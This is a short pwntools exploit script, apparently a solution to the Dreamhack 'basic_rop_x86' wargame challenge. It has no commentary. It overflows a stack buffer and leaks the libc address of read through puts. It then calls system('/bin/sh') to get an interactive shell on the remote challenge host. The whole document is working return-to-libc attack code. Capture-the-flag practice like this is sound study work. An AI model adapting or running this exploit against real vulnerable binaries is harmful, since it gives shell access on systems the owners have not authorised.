from pwn import *

p = remote('host3.dreamhack.games', 17455)
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')

pop1 = 0x80483d9
pop2 = 0x804868a
ret = 0x80483c2
main = 0x80485d9
puts_plt = e.plt['puts']
read_got = e.got['read']

payload = b'A' * 0x48
payload += p32(puts_plt) + p32(pop1) + p32(read_got)
payload += p32(main)
p.send(payload)

p.recvn(0x40)
read = u32(p.recvuntil(b'\xf7')[-4:])
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
binsh = lb + list(libc.search(b'/bin/sh'))[0]

payload = b'A' * 0x48
payload += p32(system) + p32(pop1) + p32(binsh)
p.send(payload)

p.interactive()